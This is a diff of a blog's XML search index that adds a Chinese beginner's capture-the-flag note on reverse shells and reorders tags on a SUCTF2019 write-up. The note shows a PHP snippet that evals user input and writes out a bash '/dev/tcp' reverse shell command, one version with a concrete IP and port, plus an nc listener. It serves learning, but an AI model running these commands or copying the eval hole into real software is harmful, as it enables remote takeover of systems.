@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>反弹shell入门</title>
+      <link href="/2020/02/14/%E5%8F%8D%E5%BC%B9shell/"/>
+      <url>/2020/02/14/%E5%8F%8D%E5%BC%B9shell/</url>
+      
+        <content type="html"><![CDATA[<h1 id="反弹shell入门"><a href="#反弹shell入门" class="headerlink" title="反弹shell入门"></a>反弹shell入门</h1><p>起源于今天AA师傅的一个简单web，但是由于对反弹shell的一无所知和对某些知识的偏差认识浪费了一个下午没做出来<br>反弹shell需要对标准输入输出流重定向有一点基础的理解，大致原理不在赘述，只是做个记录</p><p>上很简单的源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="PHP的命令执行"><a href="#PHP的命令执行" class="headerlink" title="PHP的命令执行"></a>PHP的命令执行</h2><p>反引号``等价于一个函数shell_exec()，传入一个参数cmd并在命令行中执行它，但是执行输出由返回值给出（所以我echo了一个下午在想为什么没有回显），<strong>使用sleep即可尝试是否进行了命令执行</strong><br>这里构造<code>$a</code>;作为$a的前五个字符，eval函数即为执行`$a`；即在命令行下输入$a的内容。所以$a的内容前五个字符确定，后门即可任意代码执行。由于执行结果在函数返回值中无法获取，则需要通过外带的方法获取结果</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>一个方法就是通过受害机反向链接攻击机取得一个shell，即为反弹shell<br>通过<code>nc -lvp port</code> 监听攻击机的端口<br>在受害机上执行<code>bash -i &gt;&amp; /dev/tcp/公网ip/port 0&gt;&amp;1</code>，链接攻击机，这个语句将受害机的标准输入输出全部重定向到攻击机上，实现在攻击机端获取受害机shell，这里实操的时候这一句还不够，需要<code>bash -c bash -i &gt;&amp; /dev/tcp/47.103.140.44/10005 0&gt;&amp;1&quot;</code>才成功连接到我的服务器上，弹shell的语句还可以构造出很多种，这只是一个无过滤的简单后门，暂时对弹shell这个操作进行入门罢了</p><h2 id="curl外带"><a href="#curl外带" class="headerlink" title="curl外带"></a>curl外带</h2><p>也可以通过curl对自己的服务器发包将数据外带，不过我还不会（菜）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 反弹shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SUCTF2019 ezweb</title>
       <link href="/2020/02/12/SUCTF2019%20ezphp/"/>
       <url>/2020/02/12/SUCTF2019%20ezphp/</url>
@@ -159,11 +184,11 @@
             
             <tag> wp </tag>
             
+            <tag> SSRF </tag>
+            
             <tag> SoapClient </tag>
             
             <tag> 反序列化 </tag>
-            
-            <tag> SSRF </tag>
             
         </tags>
       
